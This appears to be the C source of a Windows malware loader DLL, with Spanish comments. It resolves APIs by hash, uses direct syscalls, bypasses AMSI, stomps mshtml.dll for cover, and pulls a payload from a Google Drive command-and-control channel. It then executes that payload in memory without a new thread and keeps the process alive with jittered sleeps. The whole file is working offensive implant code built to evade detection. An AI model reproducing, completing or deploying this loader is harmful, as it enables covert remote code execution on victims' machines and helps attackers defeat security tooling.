#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include "crypto.h"
#include "api_hashes.h"
#include "gdrive_c2.h"
#include "advanced_bypass.h"
#include "syscalls.h"
#include "god_mode_stealth.h"

static PVOID g_SyscallGadget = NULL;
static API_TABLE g_ApiTable = {0};

static void InitializeApiTable() {
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);

    g_ApiTable.NtAllocateVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
    g_ApiTable.NtAllocateVirtualMemory.ssn = GetSSN(g_ApiTable.NtAllocateVirtualMemory.address);
    
    g_ApiTable.NtProtectVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
    g_ApiTable.NtProtectVirtualMemory.ssn = GetSSN(g_ApiTable.NtProtectVirtualMemory.address);

    g_ApiTable.NtWriteVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtWriteVirtualMemory);
    g_ApiTable.NtWriteVirtualMemory.ssn = GetSSN(g_ApiTable.NtWriteVirtualMemory.address);

    g_ApiTable.NtQueueApcThread.address = ResolveApiByHash(hNtdll, HASH_NtQueueApcThread);
    g_ApiTable.NtQueueApcThread.ssn = GetSSN(g_ApiTable.NtQueueApcThread.address);

    g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
    g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
}

static void ExecutePayload() {
    uint8_t payload[4096];
    DWORD payloadSize = 0;
    
    // 1. Obtener payload del C2
    if (!GDrive_CheckForCommands((char*)payload, sizeof(payload))) return;
    payloadSize = 4096; // Ajustar a tamaño real recibido

    // 2. Memoria RX vía Syscalls Directos
    PVOID pExec = NULL;
    SIZE_T size = payloadSize;
    InvokeSyscall(g_ApiTable.NtAllocateVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pExec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (pExec) {
        InvokeSyscall(g_ApiTable.NtWriteVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, pExec, payload, size, NULL);
        ULONG old;
        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pExec, &size, PAGE_EXECUTE_READ, &old);
        
        // Ejecución Threadless
        ThreadlessExecute(pExec);
    }
}

extern "C" __declspec(dllexport) void StartPlugin() {
    g_SyscallGadget = FindSyscallGadgetViaHash();
    InitializeApiTable();
    
    // Bypass AMSI (Estrategia Múltiple)
    BypassAMSI_HWBP(); 
    BypassAMSI_DataOnlyRobust();

    // Module Stomping para persistencia en memoria benigna
    STOMP_CONTEXT ctx = {0};
    if (ModuleStompRobust(L"mshtml.dll", 0x2000, &ctx)) {
        ExecutePayload();
    }

    // Mantener proceso vivo con jitter
    while (TRUE) {
        Sleep(60000 + (rand() % 10000));
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartPlugin, NULL, 0, NULL);
    }
    return TRUE;
}
